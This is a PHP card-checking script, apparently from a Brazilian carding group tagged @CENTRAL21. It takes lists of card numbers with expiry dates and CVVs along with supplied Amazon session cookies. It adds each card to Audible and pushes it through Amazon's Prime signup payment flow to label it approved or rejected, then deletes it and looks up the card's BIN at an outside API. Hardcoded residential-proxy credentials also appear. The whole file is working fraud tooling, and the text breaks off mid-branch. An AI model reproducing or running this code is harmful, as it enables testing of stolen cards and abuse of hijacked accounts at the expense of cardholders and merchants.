<?php
error_reporting(0);
require_once "validation.php";

$username = $_SESSION["username"];

  $lista = str_replace(array(" "), '/', $_GET['lista']);
  $regex = str_replace(array(':',";","|",",","=>","-"," ",'/','|||'), "|", $lista);

  if (!preg_match("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $regex,$lista)){
  die('<span class="text-danger">Reprovada</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Lista inválida. </span> ➔ <span class="text-warning">@CENTRAL21</span><br>');
  }

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

function multiexplode($delimiters, $string)
{
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function noExistSession(){
    if(!isset($_SESSION['token1']) || empty($_SESSION['token1'])){
        return true;

        
     } else if(!isset($_SESSION['nome']) || empty($_SESSION['nome'])){
        return true;
    
    } else if(!isset($_SESSION['urll']) || empty($_SESSION['urll'])){
        return true;
    
      } else if(!isset($_SESSION['sessionid']) || empty($_SESSION['sessionid'])){
        return true;
        
          } else if(!isset($_SESSION['offtoken']) || empty($_SESSION['offtoken'])){
        return true;
           } else if(!isset($_SESSION['nulla']) || empty($_SESSION['nulla'])){
        return true;
             } else if(!isset($_SESSION['token3']) || empty($_SESSION['token3'])){
        return true;
            } else if(!isset($_SESSION['token003']) || empty($_SESSION['token003'])){
        return true;
         
         } else if(!isset($_SESSION['p']) || empty($_SESSION['p'])){
        return true;
          }
    return false;
}


$lista = $_REQUEST['lista'];
$cc = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[0];
$mes = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[1];
$ano = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[2];
$cvv = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[3];
$time = time();

if (strlen($ano) == 2) {

$ano = "20" . $ano;

}

$bin2 = substr($cc, 0, 6);

$cookieamz = $_GET['cookie'];

if($cookieamz == null){

die("Coloque os cookies da carteira amazon.com no campo informado, por favor tente novamente.");    
    
}

if (strpos($cookieamz, 'Cookie:') !== false) {} else {

$cookieamz = 'Cookie: ' . $cookieamz;

}

$cookieamz = trim($cookieamz);

$token1 = $_SESSION['token1'];
$urll = $_SESSION['urll'];
$token3 = $_SESSION['token3'];
$sessionid = $_SESSION['sessionid'];
$offtoken = $_SESSION['offtoken'];
$token003 = $_SESSION['token003'];
$nulla = $_SESSION['nulla'];
$p = $_SESSION['p'];
$nome = $_SESSION['nome'];

if(noExistSession()){

$ch = curl_init();        
curl_setopt($ch, CURLOPT_ENCODING, "gzip");   
curl_setopt($ch, CURLOPT_URL, 'https://www.audible.com/subscription/confirmation?membershipAsin=B076FLV3HT');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
// curl_setopt($ch, CURLOPT_PROXY, "$proxy");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.audible.com',
'Widget-Ajax-Attempt-Count: 0',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/97.0.0.0',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Accept: application/json, text/javascript, */*; q=0.01',
'X-Requested-With: XMLHttpRequest',
'APX-Widget-Info: AmazonAdvertising/desktop/6hlk8JYF2ZJm',
'Referer: https://apx-security.amazon.com.mx/cpe/pm/register',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
''.$cookieamz.'',

));
$data1 = curl_exec($ch);
   
$token1 = getStr($data1, 'data-csrf-token="','"');

if($token1 == null){

$token1 = getStr($data1, 'name="csrfToken" value="','"');    
    
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://gerador-nomes.wolan.net/nome/aleatorio');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
 $gerar = curl_exec($ch);

          $nome = GetStr($gerar, '["', '"]');

          $nome = str_replace('","', '+', $nome);
     
          $nome = str_replace('ã', 'a', $nome);
          
          $nome = str_replace('ã', 'a', $nome);

          $nome = str_replace('á', 'a', $nome);

          $nome = str_replace('ó', 'o', $nome);

          $nome = str_replace('ç', 'c', $nome);

          $nome = str_replace('é', 'e', $nome);
         
          $nome = str_replace('é', 'e', $nome);
          
          $nome = str_replace('É', 'e', $nome);
          
          $nome = str_replace('í', 'i', $nome);

          $nome = str_replace('ú', 'u', $nome);

          $nome = str_replace('õ', 'o', $nome);
 
    $_SESSION['token1'] = $token1;

    $_SESSION['nome'] = $nome;
}

$username = 'kurtzjr';
$password = '98651305_country-BR';
$proxy = 'geo.iproyal.com:12321';

function removecardaudible($cookieamz){

$url = "https://www.audible.com/account/payments?ref=a_account_o_l2_nav_2";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "$cookieamz",
   "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
$getCards = curl_exec($curl);
    
$paymentId = getStr($getCards, 'data-payment-id="','"');
$csrfCard = getStr($getCards, 'data-csrf-token="','"');

$url = "https://www.audible.com/unified-payment/deactivate-payment-instrument?requestUrl=https%3A%2F%2Fwww.audible.com%2Faccount%2Fpayments%3Fref%3Da_account_o_l2_nav_2&relativeUrl=%2Faccount%2Fpayments&";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "Content-Type: application/x-www-form-urlencoded",
   "$cookieamz",
   "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
   "X-Requested-With: XMLHttpRequest",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = "isSubsConfMosaicMigrationEnabled=false&destinationUrl=%252Funified%252Fpayments%252Fmfa&transactionType=Recurring&unifiedPaymentWidgetView=true&paymentPreferenceName=Audible&clientId=audible&isAlcFlow=false&isConsentRequired=false&selectedMembershipBillingPaymentConfirmButton=adbl_accountdetails_mfa_required_credit_card_freetrial_error&selectedMembershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_purchasehistory_mfa_verification&membershipBillingNoBillingDescriptionKey=adbl_order_redrive_membership_no_billing_desc_key&membershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_billing_payments_list_desc_key&keepDialogOpenOnSuccess=false&isMfaCase=false&paymentsListChooseTextKey=adbl_accountdetails_select_default_payment_method&confirmSelectedPaymentDescriptionKey=&confirmButtonTextKey=adbl_paymentswidget_list_confirm_button&paymentsListDescriptionKey=adbl_accountdetails_manage_payment_methods_description&paymentsListTitleKey=adbl_accountdetails_manage_payment_methods&selectedPaymentDescriptionKey=&selectedPaymentTitleKey=adbl_paymentswidget_selected_payment_title&viewAddressDescriptionKey=&viewAddressTitleKey=adbl_paymentswidget_view_address_title&addAddressDescriptionKey=&addAddressTitleKey=adbl_paymentswidget_add_address_title&showEditTelephoneField=false&viewCardCvvField=false&editBankAccountDescriptionKey=&editBankAccountTitleKey=adbl_paymentswidget_edit_bank_account_title&addBankAccountDescriptionKey=&addBankAccountTitleKey=&editPaymentDescriptionKey=&editPaymentTitleKey=&addPaymentDescriptionKey=adbl_paymentswidget_add_payment_description&addPaymentTitleKey=adbl_paymentswidget_add_payment_title&editCardDescriptionKey=&editCardTitleKey=adbl_paymentswidget_edit_card_title&defaultPaymentMethodKey=adbl_accountdetails_default_payment_method&useAsDefaultCardKey=adbl_accountdetails_use_as_default_card&geoBlockAddressErrorKey=adbl_paymentswidget_payment_geoblocked_address&geoBlockErrorMessageKey=adbl_paymentswidget_geoblock_error_message&geoBlockErrorHeaderKey=adbl_paymentswidget_geoblock_error_header&addCardDescriptionKey=adbl_paymentswidget_add_card_description&addCardTitleKey=adbl_paymentswidget_add_card_title&ajaxEndpointPrefix=&geoBlockSupportedCountries=&enableGeoBlock=false&setDefaultOnSelect=true&makeDefaultCheckboxChecked=false&showDefaultCheckbox=false&autoSelectPayment=false&showConfirmButton=false&showAddButton=true&showDeleteButtons=true&showEditButtons=true&showClosePaymentsListButton=false&isDialog=false&isVerifyCvv=false&ref=a_accountPayments_c3_0_delete&paymentId=".$paymentId."&paymentType=CreditCard&tail=2888&accountHolderName=Claudio%2520Neves%2520Saloio&isValid=true&isDefault=true&issuerName=MasterCard&displayIssuerName=MasterCard&bankName=&csrfToken=".$csrfCard."&index=0&consentState=OptedIn";

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
$statusCard = curl_exec($curl);

}

function resolverCsrf($cookieamz){

$ch = curl_init();        
curl_setopt($ch, CURLOPT_ENCODING, "gzip");   
curl_setopt($ch, CURLOPT_URL, 'https://www.audible.com/subscription/confirmation?membershipAsin=B076FLV3HT');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.audible.com',
'Widget-Ajax-Attempt-Count: 0',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/97.0.0.0',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Accept: application/json, text/javascript, */*; q=0.01',
'X-Requested-With: XMLHttpRequest',
'APX-Widget-Info: AmazonAdvertising/desktop/6hlk8JYF2ZJm',
'Referer: https://apx-security.amazon.com.mx/cpe/pm/register',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
''.$cookieamz.'',

));
$data1 = curl_exec($ch);
   
$token1 = getStr($data1, 'data-csrf-token="','"');

if($token1 == null){

$token1 = getStr($data1, 'name="csrfToken" value="','"');    
    
}    
    
}

removecardaudible($cookieamz);

$ch = curl_init();        
curl_setopt($ch, CURLOPT_ENCODING, "gzip");   
   curl_setopt($ch, CURLOPT_URL, 'https://www.audible.com/unified-payment/update-payment-instrument?requestUrl=https%3A%2F%2Fwww.audible.com%2Fsubscription%2Fconfirmation%3FmembershipAsin%3DB076FLV3HT&relativeUrl=%2Fsubscription%2Fconfirmation&');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.audible.com',
'Widget-Ajax-Attempt-Count: 0',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/97.0.0.0',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Accept: application/json, text/javascript, */*; q=0.01',
'X-Requested-With: XMLHttpRequest',
'APX-Widget-Info: AmazonAdvertising/desktop/6hlk8JYF2ZJm',
'Origin: https://www.audible.com',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
''.$cookieamz.'',

));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'isSubsConfMosaicMigrationEnabled=false&destinationUrl=%2Funified%2Fpayments%2Fmfa&transactionType=Recurring&unifiedPaymentWidgetView=true&paymentPreferenceName=Audible&clientId=audible&isAlcFlow=false&isConsentRequired=false&selectedMembershipBillingPaymentConfirmButton=adbl_accountdetails_mfa_required_credit_card_freetrial_error&selectedMembershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_purchasehistory_mfa_verification&membershipBillingNoBillingDescriptionKey=adbl_order_redrive_membership_no_billing_desc_key&membershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_billing_payments_list_desc_key&keepDialogOpenOnSuccess=false&isMfaCase=false&paymentsListChooseTextKey=adbl_paymentswidget_payments_list_choose_text&confirmSelectedPaymentDescriptionKey=&confirmButtonTextKey=adbl_paymentswidget_list_confirm_button&paymentsListDescriptionKey=adbl_paymentswidget_payments_list_description&paymentsListTitleKey=adbl_paymentswidget_payments_list_title&selectedPaymentDescriptionKey=adbl_paymentswidget_selected_payment_description&selectedPaymentTitleKey=adbl_paymentswidget_selected_payment_title&viewAddressDescriptionKey=&viewAddressTitleKey=adbl_paymentswidget_view_address_title&addAddressDescriptionKey=&addAddressTitleKey=adbl_paymentswidget_add_address_title&showEditTelephoneField=false&viewCardCvvField=false&editBankAccountDescriptionKey=&editBankAccountTitleKey=adbl_paymentswidget_edit_bank_account_title&addBankAccountDescriptionKey=&addBankAccountTitleKey=&editPaymentDescriptionKey=&editPaymentTitleKey=&addPaymentDescriptionKey=adbl_paymentswidget_add_payment_description&addPaymentTitleKey=adbl_paymentswidget_add_payment_title&editCardDescriptionKey=&editCardTitleKey=adbl_paymentswidget_edit_card_title&defaultPaymentMethodKey=adbl_accountdetails_default_payment_method&useAsDefaultCardKey=adbl_accountdetails_use_as_default_card&geoBlockAddressErrorKey=adbl_paymentswidget_payment_geoblocked_address&geoBlockErrorMessageKey=adbl_paymentswidget_geoblock_error_message&geoBlockErrorHeaderKey=adbl_paymentswidget_geoblock_error_header&addCardDescriptionKey=adbl_paymentswidget_add_card_description&addCardTitleKey=adbl_paymentswidget_add_card_title&ajaxEndpointPrefix=&geoBlockSupportedCountries=&enableGeoBlock=false&setDefaultOnSelect=false&makeDefaultCheckboxChecked=false&showDefaultCheckbox=false&autoSelectPayment=true&showConfirmButton=false&showAddButton=false&showDeleteButtons=false&showEditButtons=true&showClosePaymentsListButton=false&isVerifyCvv=false&isDialog=false&selectPaymentOnSuccess=true&ref=a_sbscrptnConfrmtn_c9_edit&paymentType=CreditCard&addCreditCardNumber='.$cc.'&expirationMonth='.$mes.'&expirationYear='.$ano.'&fullName='.$nome.'&csrfToken='.$token1.'&country=US&addressLine1=230%20Vesey%20St%20Suite%20203C&addressLine2=&zipCode=10281&state=NY&city=New%20York&useAsDefault=true&addressId=&accountHolderName='.$nome.'');
  $data2 = curl_exec($ch);
   
if(strpos($data2, '"csrfTokenValid":true')){

}else{

resolverCsrf($cookieamz);
removecardaudible($cookieamz);
   
}
   
$token2 = getStr($data2, 'paymentId":"','"');

if($token2 == null){

    removecardaudible($cookieamz);

    die('<span class="text-danger">Reprovada</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Erro ao adicionar cartão no Audible.com </span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@CENTRAL21</span><br>');    
    
}

if(noExistSession()){

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.amazon.com/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.amazon.com',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/97.0.0.0',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Accept: application/json, text/javascript, */*; q=0.01',
'Referer: https://www.amazon.com/hp/wlp/pipeline/membersignup',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
''.$cookieamz.'',
));
$data151 = curl_exec($ch); 

$p = getStr($data151, 'YA:Wallet","serializedState":"','"');

$urll = getStr($data151, 'customerId":"','"');

 $_SESSION['p'] = $p;
 $_SESSION['urll'] = $urll;

}

$ch = curl_init();
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_URL, 'https://www.amazon.com/payments-portal/data/widgets2/v1/customer/'.$urll.'/continueWidget');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.amazon.com',
'Widget-Ajax-Attempt-Count: 0',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Accept: application/json, text/javascript, */*; q=0.01',
'X-Requested-With: XMLHttpRequest',
'Origin: https://www.amazon.com',
'Accept-Encoding: gzip, deflate, br',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
''.$cookieamz.'',

));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'ppw-jsEnabled=true&ppw-widgetState='.$p.'&ppw-widgetEvent=StartEditEvent&ppw-iid='.$token2.'&ppw-paymentMethodType=Card&ppw-isDefaultPaymentMethod=false');
$data333 = curl_exec($ch);
   
$payment = getStr($data333, 'instrumentId\":\"','\"');

$token17 = getStr($data333, 'ppw-widgetState\" value=\"','\"');

   if(noExistSession()){

$ch = curl_init();
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_URL, 'https://www.amazon.com/hp/wlp/pipeline/membersignup');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.amazon.com',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/97.0.0.0',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
''.$cookieamz.'',

));
$data0 = curl_exec($ch);
 
$offtoken = getStr($data0, 'offerToken" value="','"');
$sessionid = getStr($data0, 'name="session-id" value="','"');
$token003 = getStr($data0, 'name="ppw-widgetState" value="','"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_URL, 'https://www.amazon.com/payments-portal/data/widgets2/v1/customer/'.$urll.'/continueWidget');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.amazon.com',
'Origin: https://www.amazon.com',
'Content-Type: application/x-www-form-urlencoded',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/97.0.0.0',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'Referer: https://www.amazon.ae/hp/wlp/pipeline/membersignup',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
''.$cookieamz.'',

));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'ppw-widgetEvent%3AShowPreferencePaymentOptionListEvent%3A%7B%22instrumentId%22%3A%5B%22'.$payment.'%22%5D%2C%22instrumentIds%22%3A%5B%22'.$payment.'%22%5D%7D=alterar&ppw-jsEnabled=true&ppw-widgetState='.$token003.'&ie=UTF-8');
   $data0003 = curl_exec($ch);

 $nulla = getStr($data0003, 'ppw-widgetState\" value=\"','\"');
   
    $_SESSION['offtoken'] = $offtoken;
    $_SESSION['sessionid'] = $sessionid;
    $_SESSION['token003'] = $token003;
    $_SESSION['nulla'] = $nulla;

   }

$ch = curl_init();
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_URL, 'https://www.amazon.com/payments-portal/data/widgets2/v1/customer/'.$urll.'/continueWidget');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.amazon.com',
'Origin: https://www.amazon.com',
'Content-Type: application/x-www-form-urlencoded',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/97.0.0.0',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'Referer: https://www.amazon.ae/hp/wlp/pipeline/membersignup',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
''.$cookieamz.'',

));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'ppw-widgetEvent%3APreferencePaymentOptionSelectionEvent=&ppw-jsEnabled=true&ppw-widgetState='.$nulla.'&ie=UTF-8&ppw-instrumentRowSelection=instrumentId%3D'.$payment.'%26isExpired%3Dfalse%26paymentMethod%3DCC%26tfxEligible%3Dfalse');
   $data003 = curl_exec($ch);

$nulla1 = getStr($data003, 'name=\"ppw-widgetState\" value=\"','\"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_URL, 'https://www.amazon.com/payments-portal/data/widgets2/v1/customer/'.$urll.'/continueWidget');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.amazon.com',
'Origin: https://www.amazon.com',
'Content-Type: application/x-www-form-urlencoded',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/97.0.0.0',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'Referer: https://www.amazon.ae/hp/wlp/pipeline/membersignup',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
''.$cookieamz.'',

));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'ppw-jsEnabled=true&ppw-widgetState='.$nulla1.'&ppw-widgetEvent=SavePaymentPreferenceEvent');
   $data03 = curl_exec($ch);

$pay1 = getStr($data03, 'preferencePaymentMethodIds":"[\"','\"');

$pay2 = getStr($data03, '\",\"','\"]');

$ch = curl_init();
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_URL, 'https://www.amazon.com/hp/wlp/pipeline/actions');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.amazon.com',
'Origin: https://www.amazon.com',
'Content-Type: application/x-www-form-urlencoded',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/97.0.0.0',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'Referer: https://www.amazon.com/hp/wlp/pipeline/membersignup?offerToken=xRKiqLclgAT1kXj397rrXENBOVIIzaj48tANcdAddSGvusiByzPUJoxSXBCbeDl0r--gQeUbF0lm3RbebV-wMXP3WQPcBwnO-l5faBLAIvSKpjW5GNwTC7PGLZBWSzgyzBeKUC472INiw7nXy8rahOt7FuTrYv55ze94YWDqjLiDLJ-8OE6Om73SMZtPxocAWd5Ev-f_gTQnvek8a7uD7GT-HsQZ47YUqq1FYzvjRI6xdkImL9TI619iML8zM9pItJF9RP2hLxvglMBwur8XcPook0VnUR_Bm6krlQv4XiF4ZYg7gFepXZ47PSLwbYEEiZpbZdHgHDrA-HKtmpedJhv4ji_PlrgVpqewzXv3c8ITr189LwzC2s6URj3eCCzZRkUwGXHCZcwH5FDOtpdHywWmwJe6vQNXmCOS8goKa3842IoxUkxEJ0kaDJ30R-rWcCfoIepIRz5avlgHWLSMVVnZztDlXEEALULYY4j8Jjj5SNVJJON3bBqtW2oHmXnTSMtidTUnrVXOLYvbl9GV_c6mw_nuwF5eQJ4CbCwPLMzyy7ZZk3pg532XUPlyDE89cj9INx-J6Q4FAPfo8KEhxUdxEmk8XJt9hty36w4pogDy6dPhRcAPvYLV4KngXOMbafZ4xYHoV7u1UjWoCRwOCu3WE4fxc1ux1gWALrmqnPc8U5q-G7-7kODvlNc1cv6GODre6wEhV2roXPQ7Yp2-BuzK-NyQiAeWJJYg_cAdCCZjsRoLJUzT&location=prime_default&actionResult=%257B%2522success%2522%253A0%252C%2522errorType%2522%253A%2522HARDVET_VERIFICATION_FAILED%2522%252C%2522action%2522%253A%2522hardVet%2522%257D',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
''.$cookieamz.'',
));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'session-id='.$sessionid.'&primeCampaignId=dmusic_store_desktop&redirectURL=aHR0cHM6Ly93d3cuYW1hem9uLmNvbS5ici9tdXNpYy9wcmltZS9zaWdudXA%2FcmVkaXJlY3RVUkw9TDIxMWMybGpMM0J5YVcxbCZsb2FkV2VsY29tZT0x&cancelRedirectURL=L211c2ljL3ByaW1l&location=dmusic_store&wlpLocation=dmusic_store&paymentsPortalPreferenceType=PRIME&paymentsPortalExternalReferenceID=prime&paymentMethodId='.$pay1.'&isHorizonteFlow=1&actionPageDefinitionId=WLPAction_AcceptOffer_HardVet');
$response = curl_exec($ch);

if (strpos($response, 'Não foi possível concluir sua inscrição do Prime no momento. Se você ainda quiser participar do Prime, é possível se inscrever durante a finalização da compra')) {
    
    removecardaudible($cookieamz);

    $bin = json_decode(file_get_contents("https://api.priv-serverbots.store/?api=bin&bin=".substr($cc , 0,6)), true);
    $infobin = mb_strtoupper("{$bin['bandeira']} {$bin['tipo']} {$bin['nivel']} {$bin['banco']} {$bin['pais']}");

    die('<span class="text-success">Aprovada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-success"> Cartão vinculado com sucesso. </span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@CENTRAL21</span><br>');


} else if (strpos($response, 'Ocorreu um erro com sua forma pagamento. Tente inserir as informações do seu cartão novamente ou adicionar uma nova forma de pagamento.')) {
    
    removecardaudible($cookieamz);

    $bin = json_decode(file_get_contents("https://api.priv-serverbots.store/?api=bin&bin=".substr($cc , 0,6)), true);
    $infobin = mb_strtoupper("{$bin['bandeira']} {$bin['tipo']} {$bin['nivel']} {$bin['banco']} {$bin['pais']}");

    die('<span class="text-danger">Reprovada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> Cartão inexistente. </span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@CENTRAL21</span><br>');
    
    } else if (strpos($response, 'There was an error validating your payment method')) {

    removecardaudible($cookieamz);
    
    $bin = json_decode(file_get_contents("https://api.priv-serverbots.store/?api=bin&bin=".substr($cc , 0,6)), true);
    $infobin = mb_strtoupper("{$bin['bandeira']} {$bin['tipo']} {$bin['nivel']} {$bin['banco']} {$bin['pais']}");

    die('<span class="text-danger">Reprovada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> Cartão inexistente. </span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@CENTRAL21</span><br>');

} else if (strpos($response, 'We’re sorry. We’re unable to complete your Prime signup at this time. Please try again later')) {
    
    removecardaudible($cookieamz);

    $bin = json_decode(file_get_contents("https://api.priv-serverbots.store/?api=bin&bin=".substr($cc , 0,6)), true);
    $infobin = mb_strtoupper("{$bin['bandeira']} {$bin['tipo']} {$bin['nivel']} {$bin['banco']} {$bin['pais']}");

